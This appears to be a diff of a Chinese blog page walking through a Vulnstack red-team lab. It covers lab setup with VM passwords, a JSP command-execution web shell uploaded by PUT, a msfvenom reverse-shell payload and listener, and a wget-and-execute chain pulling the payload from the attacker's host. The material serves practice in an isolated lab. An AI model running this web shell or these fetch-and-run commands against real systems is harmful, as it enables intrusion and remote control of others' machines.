@@ -16,31 +16,30 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="环境搭建 靶机地址：漏洞详情 (qiyuanxuetang.net) 参考博客：红日靶场4-vulnstack4 | apsry、ATT&amp;CK实战系列-红队评估 （四）Vulnstack靶场内网域渗透 (qq.com)、红日安全ATT＆CK靶机实战系列之vulnstack4 网络结构 kali是…130  虚拟机设置   攻击机kali：192.168.12.130   Ubuntu（we">
+    <meta name="description" content="环境搭建 靶机地址：漏洞详情 (qiyuanxuetang.net) 网络结构 kali是…130  虚拟机设置   攻击机kali：192.168.12.130   Ubuntu（web） IP1：192.168.12.135 IP2：192.168.183.128 pwd：ubuntu  开启对应漏洞： 开启struts2服务 12cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Bubble&#39;s Blog">
+<meta property="og:title" content="ATT&amp;CK红队评估实战靶场4">
 <meta property="og:url" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/index.html">
 <meta property="og:site_name" content="Bubble&#39;s Blog">
-<meta property="og:description" content="环境搭建 靶机地址：漏洞详情 (qiyuanxuetang.net) 参考博客：红日靶场4-vulnstack4 | apsry、ATT&amp;CK实战系列-红队评估 （四）Vulnstack靶场内网域渗透 (qq.com)、红日安全ATT＆CK靶机实战系列之vulnstack4 网络结构 kali是…130  虚拟机设置   攻击机kali：192.168.12.130   Ubuntu（we">
+<meta property="og:description" content="环境搭建 靶机地址：漏洞详情 (qiyuanxuetang.net) 网络结构 kali是…130  虚拟机设置   攻击机kali：192.168.12.130   Ubuntu（web） IP1：192.168.12.135 IP2：192.168.183.128 pwd：ubuntu  开启对应漏洞： 开启struts2服务 12cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;">
 <meta property="og:locale" content="zn_CN">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/1.png">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/2.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/3.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/4.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/12.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/13.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/15.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/16.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/17.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/1.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/2.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/3.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/4.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/13.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/15.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/16.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/17.jpg">
 <meta property="article:published_time" content="2024-02-24T07:49:38.463Z">
-<meta property="article:modified_time" content="2023-03-23T07:10:16.058Z">
+<meta property="article:modified_time" content="2024-02-25T06:28:42.487Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/1.png">
+<meta name="twitter:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/1.png">
   
   
   
-  <title>Bubble&#39;s Blog</title>
+  <title>ATT&amp;CK红队评估实战靶场4 - Bubble&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -184,7 +183,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="ATT&amp;CK红队评估实战靶场4"></span>
           
         </div>
 
@@ -239,17 +238,16 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header"></h1>
+            <h1 id="seo-header">ATT&amp;CK红队评估实战靶场4</h1>
             
             
               <div class="markdown-body">
                 
                 <h1>环境搭建</h1>
 <p>靶机地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">漏洞详情 (qiyuanxuetang.net)</a></p>
-<p>参考博客：<a target="_blank" rel="noopener" href="https://apsry.github.io/2022/03/22/Vulnstack4/">红日靶场4-vulnstack4 | apsry</a>、<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&amp;mid=2247495964&amp;idx=4&amp;sn=078472e305f23546b40f63d81704aa4b&amp;chksm=ce645b85f913d29377b7027b8b44c6ee7e4023cd3b8406cd708177859abdbd5c7b45751ef7f7&amp;mpshare=1&amp;scene=23&amp;srcid=03231zAWBlELTkTNWJeHF3f9&amp;sharer_sharetime=1679532513633&amp;sharer_shareid=fa6dd4e46de51066973d6a18a2e78b06#rd">ATT&amp;CK实战系列-红队评估 （四）Vulnstack靶场内网域渗透 (qq.com)</a>、<a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/116059592?spm=1001.2014.3001.5502">红日安全ATT＆CK靶机实战系列之vulnstack4</a></p>
 <h2 id="网络结构">网络结构</h2>
 <p>kali是…130</p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/1.png" srcset="/img/loading.gif" lazyload class="">
 <h2 id="虚拟机设置">虚拟机设置</h2>
 <ol>
 <li>
@@ -260,7 +258,7 @@
 <p>IP1：192.168.12.135</p>
 <p>IP2：192.168.183.128</p>
 <p>pwd：ubuntu</p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/2.jpg" srcset="/img/loading.gif" lazyload alt="2"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/2.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>开启对应漏洞：</p>
 <p>开启struts2服务</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/ubuntu/Desktop/vulhub/struts2/s2-045<br>sudo docker-compose up -d<br></code></pre></td></tr></table></figure>
@@ -275,13 +273,13 @@
 <p>域成员机win7</p>
 <p>IP：192.168.183.129</p>
 <p>pwd：Dotest123</p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/3.jpg" srcset="/img/loading.gif" lazyload alt="3"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/3.jpg" srcset="/img/loading.gif" lazyload class="">
 </li>
 <li>
 <p>DC：</p>
 <p>IP：192.168.183.130</p>
 <p>pwd：Test2008→Demo2008.</p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/4.jpg" srcset="/img/loading.gif" lazyload alt="4"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/4.jpg" srcset="/img/loading.gif" lazyload class="">
 </li>
 </ol>
 <h1>外网</h1>
@@ -311,11 +309,11 @@
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.12.135:2002/</span><br></code></pre></td></tr></table></figure>
 <h3 id="修改为put方式上传木马">修改为put方式上传木马</h3>
 <figure class="highlight vbscript-html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vbscript-html"><span class="language-xml">PUT /shell.jsp/ HTTP/1.1</span><br><span class="language-xml"></span><span class="language-vbscript">&lt;%@ page import=<span class="hljs-string">&quot;java.util.*,java.io.*,java.net.*&quot;</span>%&gt;</span><span class="language-xml"></span><br><span class="language-xml"> </span><span class="language-vbscript">&lt;%</span><br><span class="language-vbscript"> %&gt;</span><span class="language-xml"></span><br><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">HTML</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BODY</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">FORM</span> <span class="hljs-attr">METHOD</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">NAME</span>=<span class="hljs-string">&quot;myform&quot;</span> <span class="hljs-attr">ACTION</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">INPUT</span> <span class="hljs-attr">TYPE</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">NAME</span>=<span class="hljs-string">&quot;cmd&quot;</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">INPUT</span> <span class="hljs-attr">TYPE</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">VALUE</span>=<span class="hljs-string">&quot;Send&quot;</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">FORM</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span></span><br><span class="language-xml"> </span><span class="language-vbscript">&lt;%</span><br><span class="language-vbscript"> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">request</span>.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;</span><br><span class="language-vbscript">         out.println(<span class="hljs-string">&quot;Command: &quot;</span> + <span class="hljs-built_in">request</span>.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) + <span class="hljs-string">&quot;\n&lt;BR&gt;&quot;</span>);</span><br><span class="language-vbscript">         Process p = Runtime.getRun<span class="hljs-built_in">time</span>().exec(<span class="hljs-built_in">request</span>.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));</span><br><span class="language-vbscript">         OutputStream os = p.getOutputStream();</span><br><span class="language-vbscript">         InputStream <span class="hljs-keyword">in</span> = p.getInputStream();</span><br><span class="language-vbscript">         DataInputStream dis = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-keyword">in</span>);</span><br><span class="language-vbscript">         String disr = dis.readLine();</span><br><span class="language-vbscript">         <span class="hljs-keyword">while</span> ( disr != <span class="hljs-literal">null</span> ) &#123;</span><br><span class="language-vbscript">                 out.println(disr); disr = dis.readLine(); &#125;</span><br><span class="language-vbscript">         &#125;</span><br><span class="language-vbscript"> %&gt;</span><span class="language-xml"></span><br><span class="language-xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">BODY</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">HTML</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/12.jpg" srcset="/img/loading.gif" lazyload alt="12"></p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/13.jpg" srcset="/img/loading.gif" lazyload alt="13"></p>
+
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/13.jpg" srcset="/img/loading.gif" lazyload class="">
 <h3 id="访问木马所在文件">访问木马所在文件</h3>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.12.135:2002/shell.jsp</span><br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/15.jpg" srcset="/img/loading.gif" lazyload alt="15"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/15.jpg" srcset="/img/loading.gif" lazyload class="">
 <h3 id="执行命令">执行命令</h3>
 <p>可以在输入框中输入命令</p>
 <h2 id="msf提权">msf提权</h2>
@@ -323,14 +321,13 @@
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.12.135 <span class="hljs-attribute">LPORT</span>=6666 -f elf &gt; shell.elf<br></code></pre></td></tr></table></figure>
 <p>搭建简易站点</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m SimpleHTTPServer <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/16.jpg" srcset="/img/loading.gif" lazyload alt="16"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/16.jpg" srcset="/img/loading.gif" lazyload class="">
 <h3 id="msf侦听">msf侦听</h3>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> lhost 192.168.12.130<br><span class="hljs-built_in">set</span> lport 6666<br><span class="hljs-built_in">set</span> payload linux/x86/meterpreter/reverse_tcp<br>run<br></code></pre></td></tr></table></figure>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4.assets/17.jpg" srcset="/img/loading.gif" lazyload alt="17"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA4/17.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>在shell.jsp上执行</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">wget <span class="hljs-keyword">http</span>://<span class="hljs-number">192.168</span><span class="hljs-number">.12</span><span class="hljs-number">.130</span>:<span class="hljs-number">9966</span>/<span class="hljs-built_in">shell</span>.elf<br>chmod <span class="hljs-number">777</span> <span class="hljs-built_in">shell</span>.elf<br>./<span class="hljs-built_in">shell</span>.elf<br></code></pre></td></tr></table></figure>
 <p>成功在msf上拿到shell权限</p>
-<h1>内网</h1>
 
                 
               </div>
@@ -338,6 +335,27 @@
             <hr/>
             <div>
               <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA/" class="category-chain-item">红队靶场</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
   
   
 </div>
@@ -360,8 +378,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/02/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA2/" title="">
-                        <span class="hidden-mobile"></span>
+                      <a href="/2024/02/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/" title="ATT&amp;CK红队评估实战靶场1">
+                        <span class="hidden-mobile">ATT&amp;CK红队评估实战靶场1</span>
                         <span class="visible-mobile">Nächster</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
